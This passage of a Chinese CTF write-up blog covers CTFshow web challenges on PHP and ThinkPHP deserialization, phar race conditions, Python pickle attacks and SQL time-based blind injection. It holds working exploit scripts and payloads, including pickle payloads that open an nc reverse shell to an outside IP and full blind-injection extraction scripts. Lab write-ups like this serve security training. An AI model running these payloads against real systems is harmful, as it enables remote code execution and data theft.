[</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>]; <span class="comment">//PHP函数的参数</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?lin=cat /f*&amp;data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</span><br></pre></td></tr></table></figure><p>lin中传入命令，data传入反序列化<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690629861855-a14768bf-7926-4b4e-8c0a-4e9fd1154539.png" alt="image.png"></p><h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><p><code>__destruct</code>当对象被销毁时调用，所以我们不需要用到反序列化函数。那么只要<code>$this-&gt;evilfile</code>是true就可以执行系统命令了。<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="function"><span class="keyword">fn</span>=</span>;cat f*</span><br><span class="line">post: flag=<span class="number">123</span></span><br></pre></td></tr></table></figure><h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/110558192">https://blog.csdn.net/miuzzx/article/details/110558192</a></p></blockquote><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>晚上挺不住，放一下别人payload：<br>在上个题的基础上增了了 判断$this-&gt;admin所以真的需要我们去通过反序列化修改admin的值了。因为题目中没有反序列化函数，所以需要通过其他方式。<br>因为题目中有写文件的函数，所以可以通过file_put_contents写phar文件，然后再通过file_put_contents触发phar反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。<br>生成phar：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;1|cat f*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>条件竞争：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import base64</span><br><span class="line">url = <span class="string">&#x27;http://b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="title function_ invoke__">open</span>(<span class="string">&#x27;./phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = f.<span class="title function_ invoke__">read</span>()</span><br><span class="line">flag = False</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">work1</span>():</span><br><span class="line">    requests.<span class="title function_ invoke__">post</span>(url+<span class="string">&quot;?fn=a&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">work2</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(url+<span class="string">&quot;?fn=phar://phar.phar/&quot;</span>, data=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> in r.text <span class="keyword">and</span> flag is False:</span><br><span class="line">        <span class="keyword">print</span>(base64.<span class="title function_ invoke__">b64encode</span>(r.text.<span class="title function_ invoke__">encode</span>()))</span><br><span class="line">        flag = True</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag is False:</span><br><span class="line">    a = threading.<span class="title function_ invoke__">Thread</span>(target=work1)</span><br><span class="line">    b = threading.<span class="title function_ invoke__">Thread</span>(target=work2)</span><br><span class="line">    a.<span class="title function_ invoke__">start</span>()</span><br><span class="line">    b.<span class="title function_ invoke__">start</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web277、web278"><a href="#web277、web278" class="headerlink" title="web277、web278"></a>web277、web278</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">__reduce__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class"><span class="title">return</span>(<span class="title">eval</span>,(&#x27;<span class="title">__import__</span>(&quot;<span class="title">os</span>&quot;).<span class="title">popen</span>(&quot;<span class="title">nc</span> <span class="title">xxx</span>.<span class="title">xxx</span>.<span class="title">xxx</span>.<span class="title">xxx</span> 4567 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">sh</span>&quot;).<span class="title">read</span>()&#x27;,))</span></span><br><span class="line"><span class="class"><span class="title">a</span>=<span class="title">A</span>()</span></span><br><span class="line"><span class="class"><span class="title">test</span>=<span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">a</span>)</span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="title">base64</span>.<span class="title">b64encode</span>(<span class="title">test</span>))</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/backdoor?data=gASVXwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxDX19pbXBvcnRfXygib3MiKS5wb3BlbigibmMgMTAxLjIwMC4xNTkuMTE5IDg4ODggLWUgL2Jpbi9zaCIpLnJlYWQoKZSFlFKULg==</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690630246109-15f492ce-0561-499f-9588-24e51f9017a4.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web214-web253SQL注入篇（三）</title>
      <link href="/2023/09/17/web214-web253SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/09/17/web214-web253SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>终于知道是哪来的注入点了，在主页的网络包中有一个<code>select.js</code>中能看到：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(<span class="punctuation">&#123;</span></span><br><span class="line">  url<span class="punctuation">:</span>&#x27;api/&#x27;<span class="punctuation">,</span></span><br><span class="line">  dataType<span class="punctuation">:</span><span class="string">&quot;json&quot;</span><span class="punctuation">,</span></span><br><span class="line">  type<span class="punctuation">:</span>&#x27;post&#x27;<span class="punctuation">,</span></span><br><span class="line">  data<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    ip<span class="punctuation">:</span>returnCitySN<span class="punctuation">[</span><span class="string">&quot;cip&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    debug<span class="punctuation">:</span><span class="number">0</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span>);</span><br></pre></td></tr></table></figure><p>向其中可以存在注入点。<br>hackbar测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689282687265-a4a97ad1-82db-4165-ba3f-d36f1b9c060b.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689282697392-c201a11b-9f33-4447-837e-6f89afbcd904.png" alt="image.png"><br>有sql执行，继续构建测试payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=if(substr(database(),1,1)=(&#x27;c&#x27;),sleep(5),1)&amp;debug=0</span><br></pre></td></tr></table></figure><p>然后就是写脚本<br>先贴一下佬们的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">Author:Y4tacker</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show/api/&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        # 查数据库</span><br><span class="line">        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br><span class="line">        # 查列名字-id.flag</span><br><span class="line">        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;&quot;</span><br><span class="line">        # 查数据</span><br><span class="line">        payload = &quot;select flaga from ctfshow_flagx&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;ip&#x27;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,</span><br><span class="line">            &#x27;debug&#x27;:&#x27;0&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.post(url, data=data, timeout=1)</span><br><span class="line">            tail = mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head = mid + 1</span><br><span class="line"></span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>我的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://6ec95228-b921-42dc-ba05-78d8a7decd79.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagx&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;select group_concat(flaga) from ctfshow_flagx&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;if(substr((&#123;&#125;),&#123;&#125;,1)=(&quot;&#123;&#125;&quot;),sleep(1),1)&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>substr这个函数不从0开始，从1开始。别傻乎乎的用错了。<br>可以用try来做一个微调，如果出现问题就可以自己修改。<br>注意要传的是<code>/api/</code>不是<code>/api</code>传错了可没有回显</p><h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><p>提示用了单引号，得闭合一下就行<br>测试payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">1</span><span class="string">&#x27; or sleep(3) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>&amp;debug=<span class="number">0</span></span><br><span class="line">或者</span><br><span class="line">ip=<span class="number">1</span><span class="string">&#x27; or sleep(3) #&amp;debug=0</span></span><br></pre></td></tr></table></figure><p>修改脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://8f775fc1-f6d1-431e-9ac4-93ab0f082a11.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxc&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;select group_concat(flagaa) from ctfshow_flagxc&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1&#x27; or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),sleep(1),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>操作可以快一点，用一点快捷键。<br>pycharm中搜索快捷键<code>ctrl + f</code>，替换快捷键<code>ctrl + r</code>。<br>搜索中修改正则：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[a-zA-Z0-<span class="number">9</span>-./]+</span><br></pre></td></tr></table></figure><p>然后替换写入新网址，这样就能快一点</p><h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><h3 id="from-base64-id"><a href="#from-base64-id" class="headerlink" title="from_base64($id)"></a>from_base64($id)</h3><p>加了一个查询：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where <span class="built_in">id</span> = from_base64($<span class="built_in">id</span>);</span><br></pre></td></tr></table></figure><p>只需要把1的base64 <code>MQ==</code>，添加的到原payload中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="string">&#x27;MQ==&#x27;</span>) <span class="keyword">or</span> sleep(<span class="number">3</span>) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&amp;debug=0</span></span><br></pre></td></tr></table></figure><h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><h3 id="benchmark函数的时间盲注"><a href="#benchmark函数的时间盲注" class="headerlink" title="benchmark函数的时间盲注"></a>benchmark函数的时间盲注</h3><p>加了个过滤，把sleep给ban了，可以用benchmark代替。<br>BENCHMARK是SQL中的一个函数,主要用于测试SQL语句的执行效率。其语法如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count, expr)</span><br></pre></td></tr></table></figure><p>其中count表示重复执行expr的次数。<br>这里的测试如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">1</span>) <span class="keyword">and</span> benchmark(<span class="number">500000</span>,sha(<span class="number">1</span>))<span class="comment">#&amp;debug=0</span></span><br></pre></td></tr></table></figure><p>由于网络环境不同，需要根据情况下微调timeout的值：<br>这里我有点没太明白的点在于，为什么调用database函数时和查询时相同benchmark的延迟差很多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">比如</span><br><span class="line">ip=<span class="number">1</span>) <span class="keyword">or</span> <span class="keyword">if</span>(substr((database()),<span class="number">1</span>,<span class="number">1</span>)=(<span class="string">&#x27;c&#x27;</span>),benchmark(<span class="number">500000</span>,sha(<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">&amp;debug=<span class="number">0</span></span><br><span class="line">有<span class="number">1.45</span>s</span><br><span class="line">而</span><br><span class="line">ip=<span class="number">1</span>) <span class="keyword">or</span> <span class="keyword">if</span>(substr((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()),<span class="number">1</span>,<span class="number">1</span>)=(<span class="string">&#x27;c&#x27;</span>),benchmark(<span class="number">3500000</span>,sha(<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">&amp;debug=<span class="number">0</span></span><br><span class="line">是<span 